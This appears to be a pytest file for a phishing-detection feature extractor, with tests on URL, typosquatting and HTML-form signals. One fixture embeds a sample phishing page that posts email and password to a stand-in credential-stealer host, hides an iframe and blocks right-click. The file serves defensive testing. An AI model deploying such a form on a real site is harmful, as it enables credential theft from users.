from app.services.feature_extractor import (
    extract_url_features,
    extract_html_features,
    extract_all_features,
    detect_brand_and_typosquatting,
)


def test_extract_url_features_standard_https():
    feats = extract_url_features("https://github.com/login", "github.com", None)
    assert feats["is_https"] is True
    assert feats["subdomain_count"] == 0
    assert feats["is_raw_ip"] is False
    assert feats["is_suspicious_tld"] is False
    assert feats["at_symbol_present"] is False
    assert "login" in feats["found_path_keywords"]


def test_extract_url_features_suspicious_phish():
    feats = extract_url_features("http://paypal.account-verify-secure.tk/login/auth", "paypal.account-verify-secure.tk", None)
    assert feats["is_https"] is False
    assert feats["is_suspicious_tld"] is True
    assert feats["subdomain_count"] >= 1
    assert feats["is_impersonation"] is True
    assert feats["matched_brand"] == "paypal"


def test_brand_typosquatting_detection():
    res1 = detect_brand_and_typosquatting("paypa1-update.com", "secure")
    assert res1["is_impersonation"] is True
    assert res1["matched_brand"] == "paypal"

    res2 = detect_brand_and_typosquatting("micros0ft-security.xyz", "")
    assert res2["is_impersonation"] is True
    assert res2["matched_brand"] == "microsoft"


def test_extract_html_features_benign_form():
    html = """
    <html>
        <head><title>GitHub Login</title></head>
        <body>
            <form action="/session" method="POST">
                <input type="text" name="login" />
                <input type="password" name="password" />
                <button type="submit">Sign In</button>
            </form>
        </body>
    </html>
    """
    feats = extract_html_features(html, "https://github.com/login")
    assert feats["has_login_form"] is True
    assert feats["has_password_input"] is True
    assert feats["has_external_form_action"] is False
    assert feats["has_suspicious_iframe"] is False
    assert feats["page_title"] == "GitHub Login"


def test_extract_html_features_malicious_form_mismatch():
    html = """
    <html>
        <head><title>PayPal - Account Verification</title></head>
        <body oncontextmenu="return false">
            <form action="http://malicious-drop.com/stealer.php" method="POST">
                <input type="hidden" name="token" value="xyz" />
                <input type="text" name="email" />
                <input type="password" name="pwd" />
                <p>Urgent action required! Your account suspended!</p>
            </form>
            <iframe style="display:none" src="http://hidden-track.com"></iframe>
        </body>
    </html>
    """
    feats = extract_html_features(html, "http://fake-paypal-login.xyz/auth")
    assert feats["has_login_form"] is True
    assert feats["has_password_input"] is True
    assert feats["has_external_form_action"] is True
    assert feats["has_disabled_right_click"] is True
    assert feats["has_suspicious_iframe"] is True
    assert len(feats["found_urgent_phrases"]) >= 1
    assert feats["title_domain_mismatch"] is True
